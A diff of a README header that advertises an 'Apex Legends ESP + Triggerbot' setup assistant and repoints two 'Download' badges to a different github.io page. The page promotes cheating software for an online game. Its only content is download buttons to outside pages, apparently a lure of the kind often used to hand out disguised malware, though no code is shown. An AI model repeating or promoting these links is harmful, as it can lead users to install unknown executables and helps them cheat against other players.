@@ -1,7 +1,7 @@
 # 🎯 Apex Legends ESP + Triggerbot — Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://skinswapinfow.github.io/skinswapinfoV/)
-[![Download Now](https://img.shields.io/badge/Download_Now-Green?style=for-the-badge&logo=github)](https://skinswapinfow.github.io/skinswapinfoV/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://download-portal-demo.github.io/.github/ApexESPtrigggerbotT1)
+[![Download Now](https://img.shields.io/badge/Download_Now-Green?style=for-the-badge&logo=github)](https://download-portal-demo.github.io/.github/ApexESPtrigggerbotT1)
 
 ---
 
